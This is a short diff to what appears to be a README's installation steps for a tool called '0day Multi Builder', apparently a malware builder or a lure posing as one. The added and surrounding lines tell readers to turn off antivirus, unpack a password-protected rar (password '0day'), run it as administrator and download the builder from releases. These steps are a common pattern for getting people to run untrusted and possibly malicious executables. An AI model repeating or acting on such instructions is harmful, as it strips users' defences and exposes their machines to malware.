@@ -6,6 +6,7 @@
 Installation
 
     Turn Off Antivirus
+    Extract files rar password: 0day
     Right Click Run as Administrator
     Go to realeases and download the )day Multi Builder
     You're are good to go!
